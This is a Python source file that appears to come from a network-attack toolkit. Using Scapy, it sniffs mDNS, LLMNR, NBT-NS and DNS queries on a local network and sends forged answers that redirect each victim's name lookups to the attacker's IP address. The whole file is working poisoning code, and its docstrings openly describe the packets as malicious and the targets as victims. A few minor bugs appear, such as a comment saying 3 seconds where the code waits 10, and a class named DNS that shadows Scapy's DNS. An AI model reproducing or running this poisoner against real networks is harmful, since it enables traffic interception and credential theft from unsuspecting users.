#!/usr/bin/env python
# -*- coding: utf-8 -*-


from typing import List, Tuple, Type
import binascii
from scapy.all import (
    DNSRR,
    DNS,
    Ether,
    IP,
    UDP,
    sendp,
    sniff,
    packet,
    IPv6,
    LLMNRResponse,
    LLMNRQuery,
    NBNSQueryRequest,
    Raw,
    DNSQR,
)
from .poisoninfo import PoisonNetworkInfo
import time
from loguru import logger
from threading import Thread
from colorama import Fore, Style


class MDNS(PoisonNetworkInfo):
    """[ MDNS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface)
        self.__targets_used = []
        self.__logger_level = level
        self.__info_logger = info_logger

    @property
    def logger_level(self) -> str:
        return self.__logger_level

    @logger_level.setter
    def logger_level(self, level: str) -> None:
        self.__logger_level = level

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(
            rrname=pkt[DNS].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def __data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    # I have used packet.Type becasue packet dont work with Tuple
    # https://python-type-checking.readthedocs.io/en/latest/types.html#ordinary-classes
    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def __transport_layer(self, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport="mdns", dport="mdns")
        return response

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= DNS(
            id=pkt[DNS].id,
            qr=1,
            opcode="QUERY",
            aa=1,
            rd=0,
            rcode="ok",
            qdcount=0,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=None,
            an=self.__dns_resource_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.__info_logger.debug("Packet crafted: ")
        self.__info_logger.debug(response.summary())
        if ip_of_the_packet not in self.__targets_used:
            self.__info_logger.log(
                self.__logger_level,
                f"{Fore.CYAN}(MDNS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.__targets_used.append(ip_of_the_packet)

    def __filter_for_mdns(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(DNS)
            and (
                (pkt.haslayer(IP) and pkt[IP].dst == "224.0.0.251")
                or (pkt.haslayer(IPv6) and pkt[IPv6].dst == "ff02::fb")
            )
            and pkt[DNS].qd is not None
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_mdns(pkt):
            response = self.__data_link_layer(pkt)
            response, ip_of_the_packet = self.__network_layer(pkt, response)
            response = self.__transport_layer(response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_mdns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.__info_logger.log(self.__logger_level, "Starting mdns poisoning...")
        cleaner_thread = Thread(target=self.__cleaner)
        cleaner_thread.daemon = True
        cleaner_thread.start()
        sniff(
            filter="udp and port mdns",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )

    def __cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.__targets_used.clear()


class LLMNR(PoisonNetworkInfo):
    """[ LLMNR poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        ipv6: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, ipv6, mac_address, iface)
        self.__targets_used = []
        self.__logger_level = level
        self.__info_logger = info_logger

    @property
    def logger_level(self) -> str:
        return self.__logger_level

    @logger_level.setter
    def logger_level(self, level: str) -> None:
        self.__logger_level = level

    def __data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    # I have used packet.Type becasue packet dont work with Tuple
    # https://python-type-checking.readthedocs.io/en/latest/types.html#ordinary-classes
    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def __transport_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=5355, dport=pkt[UDP].sport)
        return response

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(
            rrname=pkt[LLMNRQuery].qd.qname,
            type="A",
            rclass="IN",
            ttl=120,
            rdlen=None,
            rdata=self.ip,
        )

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= LLMNRResponse(
            id=pkt[LLMNRQuery].id,
            qr=1,
            opcode="QUERY",
            c=0,
            tc=0,
            z=0,
            rcode="ok",
            qdcount=1,
            ancount=1,
            nscount=0,
            arcount=0,
            qd=pkt[LLMNRQuery].qd,
            an=self.__dns_resource_record(pkt),
            ns=None,
            ar=None,
        )
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.__info_logger.debug("Packet crafted: ")
        self.__info_logger.debug(response.summary())
        if ip_of_the_packet not in self.__targets_used:
            self.__info_logger.log(
                self.__logger_level,
                f"{Fore.CYAN}(LLMNR) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.__targets_used.append(ip_of_the_packet)

    def __filter_for_llmnr(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return (
            pkt.haslayer(LLMNRQuery)
            and (
                (pkt.haslayer(IP) and pkt[IP].dst == "224.0.0.252")
                or (pkt.haslayer(IPv6) and pkt[IPv6].dst == "ff02::1:3")
            )
            and pkt[LLMNRQuery].qd is not None
        )

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_llmnr(pkt):
            response = self.__data_link_layer(pkt)
            response, ip_of_the_packet = self.__network_layer(pkt, response)
            response = self.__transport_layer(pkt, response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_llmnr_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.__info_logger.log(self.__logger_level, "Starting llmnr poisoning...")
        cleaner_thread = Thread(target=self.__cleaner)
        cleaner_thread.daemon = True
        cleaner_thread.start()
        sniff(
            filter="udp and port 5355",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )

    def __cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.__targets_used.clear()


class NBT_NS(PoisonNetworkInfo):
    """[ NBT_NS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, None, mac_address, iface)
        self.__targets_used = []
        self.__logger_level = level
        self.__info_logger = info_logger

    @property
    def logger_level(self) -> str:
        return self.__logger_level

    @logger_level.setter
    def logger_level(self, level: str) -> None:
        self.__logger_level = level

    def __data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if pkt[IP].src == self.ip:
            return response, ip_of_the_packet
        response /= IP(dst=pkt[IP].src)
        ip_of_the_packet = pkt[IP].src
        return response, ip_of_the_packet

    def __transport_layer(self, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=137, dport=137)
        return response

    def __ip_to_hex(self) -> bytes:
        """[ Method to pass an ip to hexadecimal ]
        Returns:
            bytes: [ the hexadecimal value of the ip in a bytearray ]
        """
        ip_splited = self.ip.split(".")
        ip_hex = ""
        for number in ip_splited:
            ip_hex = ip_hex + hex(int(number))[2:]
        return bytearray.fromhex(ip_hex)

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= NBNSQueryRequest(
            NAME_TRN_ID=pkt[NBNSQueryRequest].NAME_TRN_ID,
            FLAGS=0x8500,  # 34048
            QDCOUNT=0,
            ANCOUNT=1,
            NSCOUNT=0,
            ARCOUNT=0,
            QUESTION_NAME=pkt[NBNSQueryRequest].QUESTION_NAME,
            SUFFIX=pkt[NBNSQueryRequest].SUFFIX,
            NULL=0,
            QUESTION_TYPE=pkt[NBNSQueryRequest].QUESTION_TYPE,
            QUESTION_CLASS=pkt[NBNSQueryRequest].QUESTION_CLASS,
        )
        response /= Raw()
        # TTL:165
        response[Raw].load += b"\x00\x00\x00\xa5"
        # Data length: 6
        response[Raw].load += b"\x00\x06"
        # Flags: (B-node,unique)
        response[Raw].load += b"\x00\x00"
        # ip 0.0.0.0

        response[Raw].load += self.__ip_to_hex()
        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.__info_logger.debug("Packet crafted: ")
        self.__info_logger.debug(response.summary())
        response.summary()
        if ip_of_the_packet not in self.__targets_used:
            self.__info_logger.log(
                self.__logger_level,
                f"{Fore.CYAN}(NBT_NS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.__targets_used.append(ip_of_the_packet)

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if pkt.haslayer(NBNSQueryRequest):
            response = self.__data_link_layer(pkt)
            response, ip_of_the_packet = self.__network_layer(pkt, response)
            response = self.__transport_layer(response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_nbt_ns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.__info_logger.log(self.__logger_level, "Starting nbt-ns poisoning...")
        cleaner_thread = Thread(target=self.__cleaner)
        cleaner_thread.daemon = True
        cleaner_thread.start()
        sniff(
            filter="udp and port 137",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )

    def __cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.__targets_used.clear()


class DNS(PoisonNetworkInfo):
    """[ DNS poisoner ]
    Args:
        ip (str): [ if of the attacker ]
        ipv6 (str): [ ipv6 of the attacker ]
        mac_address (str): [ mac of the attacker ]
        iface (str): [ interface of the current subnet used ]
        info_logger (logger): [ Logger for the output ]
        level (logger): [ Logger level to display information ]
    """

    def __init__(
        self,
        ip: str,
        mac_address: str,
        iface: str,
        info_logger: logger,
        level: str = "INFO",
    ):
        super().__init__(ip, None, mac_address, iface)
        self.__targets_used = []
        self.__logger_level = level
        self.__info_logger = info_logger

    @property
    def logger_level(self) -> str:
        return self.__logger_level

    @logger_level.setter
    def logger_level(self, level: str) -> None:
        self.__logger_level = level

    def __data_link_layer(self, pkt: packet) -> packet:
        """[ Add link layer to response packet ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            [ packet ]: [ Package with link layer added ]
        """
        return Ether(dst=pkt[Ether].src, src=self.mac_address)

    def __network_layer(self, pkt: packet, response: packet) -> Tuple[packet.Type, str]:
        """[ Add network layer to the response packet ]

        Args:
            pkt (packet): [ sniffed packet ]
            response (packet): [ Packet to be send to the victim  ]

        Returns:
            Tuple[packet.Type, str]: [ malicious package and ip of the target ]
        """
        ip_of_the_packet = None
        if IP in pkt:
            if pkt[IP].src == self.ip:
                return
            response /= IP(dst=pkt[IP].src)
            ip_of_the_packet = pkt[IP].src
        elif IPv6 in pkt:
            if pkt[IPv6].src == self.ipv6:
                return
            response /= IPv6(dst=pkt[IPv6].src)
            ip_of_the_packet = pkt[IPv6].src
        return response, ip_of_the_packet

    def __transport_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add transport layer to the response packet ]

        Args:
            response (packet): [ Packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """
        response /= UDP(sport=53, dport=pkt[UDP].sport)
        return response

    def __dns_resource_record(self, pkt: packet) -> DNSRR:
        """[ Function to configure dns record for the response ]

        Args:
            pkt (packet): [ sniffed package ]

        Returns:
            DNSRR: [ DNS record ]
        """
        return DNSRR(rrname=pkt[DNSQR].qname, rdata=self.ip)

    def __application_layer(self, pkt: packet, response: packet) -> packet:
        """[ Add application layer to the response packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
            response (packet): [ packet to be send to the victim ]

        Returns:
            packet: [ Malicious packet ]
        """

        response /= DNS(
            id=pkt[DNS].id,
            ancount=1,
            an=self.__dns_resource_record(pkt),
        )

        return response

    def __send_packet(self, response: packet, ip_of_the_packet: str) -> None:
        """[ Function to send the malicious packet to the victim ]

        Args:
            response (packet): [ Malicious packet ]
            ip_of_the_packet (str): [ ip of the victim ]
        """
        self.__info_logger.debug("Packet crafted: ")
        self.__info_logger.debug(response.summary())
        if ip_of_the_packet not in self.__targets_used:
            self.__info_logger.log(
                self.__logger_level,
                f"{Fore.CYAN}(DNS) Sending packet to {ip_of_the_packet}{Style.RESET_ALL}",
            )
            sendp(response, verbose=False)
            self.__targets_used.append(ip_of_the_packet)

    def __filter_for_dns(self, pkt: packet) -> bool:
        """[ Filter by sniffed packets of interest ]

        Args:
            pkt (packet): [ sniffed packet ]

        Returns:
            bool: [ If the packet is asking for a resource ]
        """
        return pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0

    def __craft_malicious_packets(self, pkt: packet) -> None:
        """[ Function to craft a malicious packet ]

        Args:
            pkt (packet): [ Sniffed packet ]
        """
        if self.__filter_for_dns(pkt):
            response = self.__data_link_layer(pkt)
            response, ip_of_the_packet = self.__network_layer(pkt, response)
            response = self.__transport_layer(pkt, response)
            response = self.__application_layer(pkt, response)
            self.__send_packet(response, ip_of_the_packet)

    def start_dns_poisoning(self) -> None:
        """[ Function to start the poisoner ]"""
        self.__info_logger.log(self.__logger_level, "Starting dns poisoning...")
        cleaner_thread = Thread(target=self.__cleaner)
        cleaner_thread.daemon = True
        cleaner_thread.start()
        sniff(
            filter="udp and port 53",
            iface=self.iface,
            prn=self.__craft_malicious_packets,
            store=0,
        )

    def __cleaner(self) -> None:
        """[ Function to clean the list of objectives every 3 seconds ]"""
        while True:
            time.sleep(10)
            self.__targets_used.clear()
